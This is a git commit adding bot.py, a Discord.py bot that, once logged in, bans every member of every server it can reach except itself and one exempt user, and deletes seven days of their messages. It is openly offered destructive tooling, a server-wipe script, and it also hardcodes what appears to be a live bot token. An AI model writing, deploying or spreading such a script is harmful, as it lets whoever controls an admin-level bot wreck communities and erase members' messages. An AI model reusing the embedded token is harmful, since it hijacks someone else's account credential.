586f066bb7cfe5b6cd0c1ca0887e58e69825b30f
Dqu1J <mcpeytwot5@gmail.com>
2020-01-31 22:04:37 +0200

    Create bot.py
    Yes

---
+++ bot.py
@@ -0,0 +1,32 @@
+# The Discord.py bot that BANs everyone except selected user and bot itself!
+
+import discord
+
+botid = "672883371722014783"
+nobanid = "123213123123123"
+noban = False
+token = "NjcyODgzMzcxNzIyMDE0Nzgz.XjR_Wg.BsqM-Q9k9qzh4bRuu0__Qvk9quE"
+
+client = discord.Client()
+
+@client.event
+async def on_ready():
+    print('Logged in!')
+    for member in client.get_all_members():
+        print(f"Banning {member.display_name}!")
+        if str(member.id) == botid:
+            print("Oops! It is me!")
+            continue
+        if str(member.id) == nobanid:
+            if noban == True:
+                print("Oops! We dont ban him.")
+                continue
+        try:
+            await member.ban(reason="Thor has hit you with his hammer!", delete_message_days=7)
+        except:
+            print(f"Oops! I cant ban {member.display_name} for some reason! Maybe he is owner?")
+            continue
+        print(f"Banned {member.display_name}!")
+    print("Banning is complete!")
+
+client.run(token)
